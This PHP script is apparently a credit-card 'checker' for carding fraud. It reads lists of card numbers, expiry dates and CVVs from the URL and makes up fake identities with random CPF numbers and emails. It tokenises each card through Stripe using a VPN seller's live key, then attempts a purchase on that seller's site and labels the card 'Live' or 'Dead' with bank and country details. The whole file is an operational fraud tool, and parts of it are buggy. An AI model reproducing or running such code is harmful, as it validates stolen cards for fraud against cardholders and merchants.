<?php
extract($_GET);
error_reporting(1);
date_default_timezone_set('America/Sao_Paulo');
DeletarCookies();
$randCookie = rand(100000000,999999999);
$loadtime = time();

function deletarCookies() {
    if (file_exists("functioncookie.txt")) {
        unlink("functioncookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mm = $explode[1];
$yy = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,6);
$number2 = substr($cc,6,6);
$number3 = substr($cc,12,6);
$number4 = substr($cc,18,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function cpf($compontos)
{
    $n1 = rand(0,9);
    $n2 = rand(0,9);
    $n3 = rand(0,9);
    $n4 = rand(0,9);
    $n5 = rand(0,9);
    $n6 = rand(0,9);
    $n7 = rand(0,9);
    $n8 = rand(0,9);
    $n9 = rand(0,9);
    $d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
    $d1 = 11 - ( mod($d1,11) );

    if ( $d1 >= 10 )
    { 
        $d1 = 0 ;
    }

    $d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
    $d2 = 11 - ( mod($d2,11) );

    if ($d2>=10) 
    {
        $d2 = 0 ;
    }
    $retorno = '';
    if ($compontos==1) 
    {
        $retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;
    }
    return $retorno;
}


function dadosnome()
{
    $nome = file("lista_nomes.txt");
    $mynome = rand(0, sizeof($nome)-1);
    $nome = $nome[$mynome];
    return $nome;
}
function dadossobre()
{
    $sobrenome = file("lista_sobrenomes.txt");
    $mysobrenome = rand(0, sizeof($sobrenome)-1);
    $sobrenome = $sobrenome[$mysobrenome];
    return $sobrenome;
}


function email($nome)
{
    $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
    return $email;
}



$cpf = cpf(1);
$nome = dadosnome();
$sobrenome = dadossobre();
$email = email($nome);
$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
//        'Authorization: Bearer production_x5pgt93p_2g56tms764458hmf',
//        'Braintree-Version: 2018-05-10',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/m/v3/index-3f0dc197837628f45156bf4f7ed0f6ad.html?distinct_id=81dab6e3-6603-6a45-c6bf-f7f3faef7f17'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$random.'%40anon.ph&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F303cf2d)&referrer=https%3A%2F%2Fhidester.com%2Fbuy-vpn%2F&pasted_fields=email%2Cnumber&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&card[cvc]='.$cvv.'&card[name]=miks%40anon.ph&time_on_page=42663&guid=ba7f89e0-2aaf-42db-ac82-c15d35d53a8b&muid=36a5fe70-88af-41e4-bdac-d9d220a4486c&sid=5734a4c3-a32c-48d0-8903-0dfaf928d910&key=pk_live_m3SA2Nf8blyfAQRwnExtvDb8');
$page = curl_exec($ch);
       $token = json_decode($page, true);
//    $init_token = $token['token']['id'];
    $token1 = $token['id'];
    $init_token2 = $token['card']['id'];
//$cardid = trim(strip_tags(getstr($page,' "id": "','"')));

$last = substr($cc, 11,4);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://hidester.com//wp-content/plugins/whmcsintegration/stripe.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
//    'Host: payments.privateinternetaccess.com',
'Origin: https://hidester.com',
'Referer: https://hidester.com/buy-vpn/'));
curl_setopt($ch1, CURLOPT_POSTFIELDS, 'price=999&email='.$random.'%40anon.ph&token='.$token.'&product_id=16&promocode=&currency=USD&password=weakkapa123&bc=1');
$page2 = curl_exec($ch);
//$message = json_decode($page2, true);

//echo $page;


//echo $page2;

if($cbin == "6")//DISCOVER
{
    $cbin = "<font color='gray'><i class='fa fa-cc-discover' aria-hidden='true'></i></font>";
}
else if($cbin == "5")//MASTERCARD
{
    $cbin = "<font color='red'><i class='fa fa-cc-mastercard' aria-hidden='true'></i></font>";
}
else if($cbin == "4")//VISA
{
    $cbin = "<font color='blue'><i class='fa fa-cc-visa' aria-hidden='true'></i></font>";
}
else if($cbin == "3")//AMEX
{
    $cbin = "<font color='gold'><i class='fa fa-cc-amex' aria-hidden='true'></i></font>";
}

else if($cbin == "0")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "1")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "2")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "8")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "9")
{
    $cbin = "<font color='red'>✘</font>";
}

#-----------------------------------------------------------------------------------------------------------------------------------------#
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

#-----------------------------------------------------------------------------------------------------------------------------------------#
$messages = $message["response"];

if (strpos($page2, 'success'))
{
    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
echo '<font  color="lime">Live  '.$lista.' | [ Card: '.$bandeira.' | Bank: '.$banco.' | Country: '.$level.' | Country Code: '.$pais.' ]  ['.$messages.'] </font><br></font><br>';
}
elseif(strpos($page2, "error"))
{
    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
    echo '<font  color="blue">#Dead  '.$lista.' | [ Card: '.$bandeira.' | Bank: '.$banco.' | Country: '.$level.' | Country Code: '.$pais.' ]  ["'.$message.'"] </font><br></font><br>';
}else
{
    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
    echo '<font  color="gray">#Live  '.$lista.' | [ Card: '.$bandeira.' | Bank: '.$banco.' | Country: '.$level.' | Country Code: '.$pais.' ]  ['.$messages.'] </font><br></font><br>';
}
curl_close($ch);
ob_flush();

?>